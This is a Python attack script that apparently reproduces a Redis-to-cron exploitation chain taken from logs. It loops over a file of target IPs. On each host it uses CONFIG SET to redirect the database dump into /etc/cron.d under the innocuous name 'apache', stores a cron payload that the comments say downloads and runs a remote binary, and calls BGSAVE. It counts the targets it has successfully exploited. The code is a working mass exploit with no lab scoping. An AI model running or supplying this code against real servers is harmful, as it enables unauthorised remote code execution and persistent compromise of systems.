import redis
import argparse
import sys
import time

# Define the malicious cron job payload
# This payload is base64 decoded from the logs provided.
# It attempts to download and execute a file named 'mysql' into /tmp
# via curl or wget, then sets it as executable and runs it in the background.
CRON_PAYLOAD = """
\n\n\n\n\n*/1 * * * * root sh -c 'echo [base64 encoded payload]|base64 -d|sh'\n\n\n\n
"""

def replicate_attack(host, port, password=None, timeout=5):
    """
    Attempts to connect to a Redis instance and replicate the cron job attack.

    Args:
        host (str): The IP address or hostname of the Redis server.
        port (int): The port of the Redis server.
        password (str, optional): The Redis password if authentication is required. Defaults to None.
        timeout (int): Connection timeout in seconds.

    Returns:
        bool: True if the attack chain was successfully executed, False otherwise.
    """
    print(f"\n[+] Attempting to exploit {host}:{port}...")
    try:
        # Establish a Redis connection
        # decode_responses=True ensures that responses are returned as strings instead of bytes
        r = redis.StrictRedis(
            host=host,
            port=port,
            password=password,
            socket_connect_timeout=timeout,
            socket_timeout=timeout,
            decode_responses=True
        )

        # Ping the server to check connectivity and authentication
        r.ping()
        print(f"[*] Successfully connected to {host}:{port}.")

        # Step 1: Change the Redis working directory to /etc/cron.d
        # This allows Redis to write files into the cron.d directory,
        # which Linux systems use to schedule cron jobs.
        print(f"[*] Setting Redis 'dir' to '/etc/cron.d'...")
        response_dir = r.config_set('dir', '/etc/cron.d')
        if response_dir:
            print(f"    - CONFIG SET dir response: {response_dir}")
        else:
            print(f"    - CONFIG SET dir failed or returned unexpected response.")
            return False

        # Step 2: Change the Redis database filename to 'apache'
        # When Redis saves its database (BGSAVE), it will now write to
        # /etc/cron.d/apache. The 'apache' filename is arbitrary, but
        # it helps to make the file look innocuous.
        print(f"[*] Setting Redis 'dbfilename' to 'apache'...")
        response_dbfilename = r.config_set('dbfilename', 'apache')
        if response_dbfilename:
            print(f"    - CONFIG SET dbfilename response: {response_dbfilename}")
        else:
            print(f"    - CONFIG SET dbfilename failed or returned unexpected response.")
            return False

        # Step 3: Set a Redis key with the cron job payload
        # The key 't' is arbitrary. The payload contains newlines
        # to ensure it's a valid, self-contained cron entry when written
        # to the file. EX 120 sets an expiration, but the cron job persists
        # once written during BGSAVE.
        print(f"[*] Setting key 't' with cron job payload...")
        # The 'nx' parameter is not used here as it was not in the original log.
        # The 'ex' parameter sets an expiry of 120 seconds for the key 't'.
        response_set = r.set('t', CRON_PAYLOAD, ex=120)
        if response_set:
            print(f"    - SET key 't' response: {response_set}")
        else:
            print(f"    - SET key 't' failed or returned unexpected response.")
            return False

        # Step 4: Force Redis to save the database (BGSAVE)
        # This is the crucial step that writes the 'apache' file (containing
        # the cron job) to /etc/cron.d/.
        print(f"[*] Forcing Redis to save database (BGSAVE)...")
        # BGSAVE runs in the background. We don't need to wait for its completion
        # for the command to be considered 'successful' from the attacker's perspective.
        response_bgsave = r.bgsave()
        if response_bgsave:
            print(f"    - BGSAVE response: {response_bgsave}")
            print(f"[+] Attack chain successfully sent to {host}:{port}.")
            print(f"    - The cron job should be written to /etc/cron.d/apache upon BGSAVE completion.")
            return True
        else:
            print(f"    - BGSAVE failed or returned unexpected response.")
            return False

    except redis.exceptions.ConnectionError as e:
        print(f"[-] Connection error to {host}:{port}: {e}")
    except redis.exceptions.AuthenticationError:
        print(f"[-] Authentication failed for {host}:{port}. Password might be required.")
    except redis.exceptions.ResponseError as e:
        print(f"[-] Redis response error on {host}:{port}: {e}")
        print(f"    (This might indicate a protected mode, non-existent command, or permission issue)")
    except Exception as e:
        print(f"[-] An unexpected error occurred with {host}:{port}: {e}")
    return False

def main():
    parser = argparse.ArgumentParser(
        description="Replicates a Redis cron job exploitation chain from a list of IPs."
    )
    parser.add_argument(
        '-f', '--file',
        type=str,
        required=True,
        help="Path to a file containing target IPs (one per line). "
             "Format: 'IP' or 'IP:PORT'."
    )
    parser.add_argument(
        '-p', '--password',
        type=str,
        default=None,
        help="Optional: Redis password if authentication is required."
    )
    parser.add_argument(
        '-d', '--default-port',
        type=int,
        default=52254, # Using the port from your logs as the default
        help="Default Redis port to use if not specified in the input file (e.g., 6379, 52254)."
    )
    parser.add_argument(
        '-t', '--timeout',
        type=int,
        default=5,
        help="Connection timeout in seconds."
    )

    args = parser.parse_args()

    target_ips = []
    try:
        with open(args.file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'): # Ignore empty lines and comments
                    target_ips.append(line)
    except FileNotFoundError:
        print(f"[ERROR] File not found: {args.file}")
        sys.exit(1)
    except Exception as e:
        print(f"[ERROR] Could not read file {args.file}: {e}")
        sys.exit(1)

    if not target_ips:
        print("[WARNING] No target IPs found in the file. Exiting.")
        sys.exit(0)

    print(f"[*] Starting attack replication against {len(target_ips)} targets...")
    print(f"[*] Default Redis port: {args.default_port}")
    print(f"[*] Connection timeout: {args.timeout} seconds")

    successful_exploits = 0
    for target in target_ips:
        host = target
        port = args.default_port

        if ':' in target:
            try:
                host, port_str = target.split(':')
                port = int(port_str)
            except ValueError:
                print(f"[ERROR] Invalid target format '{target}'. Skipping.")
                continue

        if replicate_attack(host, port, args.password, args.timeout):
            successful_exploits += 1

        time.sleep(1) # Small delay between targets to avoid hammering

    print(f"\n[+] Script finished.")
    print(f"[+] Total targets attempted: {len(target_ips)}")
    print(f"[+] Successfully exploited targets: {successful_exploits}")

if __name__ == "__main__":
    main()
